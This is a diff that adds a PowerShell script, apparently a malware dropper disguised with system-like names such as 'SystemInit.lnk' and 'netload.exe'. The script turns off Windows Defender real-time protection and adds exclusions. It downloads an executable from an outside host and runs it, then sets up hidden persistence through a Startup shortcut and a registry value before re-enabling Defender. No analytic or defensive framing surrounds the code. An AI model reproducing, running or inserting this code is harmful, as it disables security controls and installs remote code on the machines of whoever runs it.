@@ -1,0 +1,38 @@
+$chkFlag = Join-Path $env:TEMP 'runonce.lock'
+if (Test-Path $chkFlag) { exit }
+New-Item $chkFlag -ItemType File -Force | Out-Null
+$tempDir = 'C:\Windows\Temp'
+$tempFile = Join-Path $tempDir 'sysdata.tmp'
+$dataDir = Join-Path $env:APPDATA 'NetTemp'
+New-Item -Path $dataDir -ItemType Directory -Force | Out-Null
+$binFile = Join-Path $dataDir 'netload.exe'
+$scPath = [Environment]::GetFolderPath('Startup') + '\SystemInit.lnk'
+$startupReg = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\StartupFolder'
+$scName = 'SystemInit.lnk'
+$activeVal = [byte[]](2,0,0,0)
+$comShell = New-Object -ComObject WScript.Shell
+Set-MpPreference -DisableRealtimeMonitoring $true
+Add-MpPreference -ExclusionPath $tempDir
+Add-MpPreference -ExclusionPath $dataDir
+Add-MpPreference -ExclusionProcess $binFile
+Start-Sleep -Seconds 1
+$dlURL = 'http://bknsverf.com/sls/bdxnsmp.exe'
+Invoke-WebRequest -Uri $dlURL -OutFile $tempFile
+Copy-Item $tempFile -Destination $binFile -Force
+Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
+Start-Process $binFile
+Start-Sleep -Seconds 2
+try {
+  $shortcut = $comShell.CreateShortcut($scPath)
+  $shortcut.TargetPath = $binFile
+  $shortcut.WindowStyle = 7
+  $shortcut.IconLocation = $binFile + ',0'
+  $shortcut.Save()
+} catch {}
+Start-Sleep -Milliseconds 500
+if (Test-Path $startupReg) {
+  try { Set-ItemProperty -Path $startupReg -Name $scName -Value $activeVal -Force } catch {}
+}
+Start-Sleep -Seconds 8
+Set-MpPreference -DisableRealtimeMonitoring $false
+Remove-Item $chkFlag -Force
